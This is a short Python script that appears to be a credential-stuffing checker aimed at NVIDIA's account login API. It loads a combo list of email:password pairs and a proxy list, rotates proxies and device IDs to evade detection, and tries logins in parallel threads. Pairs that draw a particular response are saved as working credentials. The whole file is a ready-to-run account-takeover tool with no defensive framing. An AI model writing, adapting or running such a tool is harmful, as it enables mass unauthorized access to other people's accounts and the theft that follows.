from lib import request, parse, loader
from random import choice
from concurrent import futures
from uuid import uuid4

loader.load_combo('amine.txt')
loader.load_proxies('https', file='proxies.txt')

def check(email, password):
   id = str(uuid4())
   proxy = choice(loader.proxies)
   data = {"email":f"{email}","password":f"{password}","deviceId":f"{id}"}
   headers = {'ContentType': 'application/json', 'Host': 'accounts.nvgs.nvidia.com', 'Connection': 'keep-alive', 'User-Agent': '<UA>', 'Accept': '*/*', 'Origin': 'https', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9'}
   # Start
   block = request.get_response('POST', 'https://accounts.nvgs.nvidia.com/api/1/authentication/user/login', json=data, headers=headers, proxies=proxy, timeout=5)
   block.fail(statement='CREDENTIALS_INVALID')
   block.fail(statement='PATTERN_MISMATCH')
   block.success(statement='FORBIDDEN', save=True, save_this=f'{email}:{password}\n')
   # End
   request.result()
   
futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)
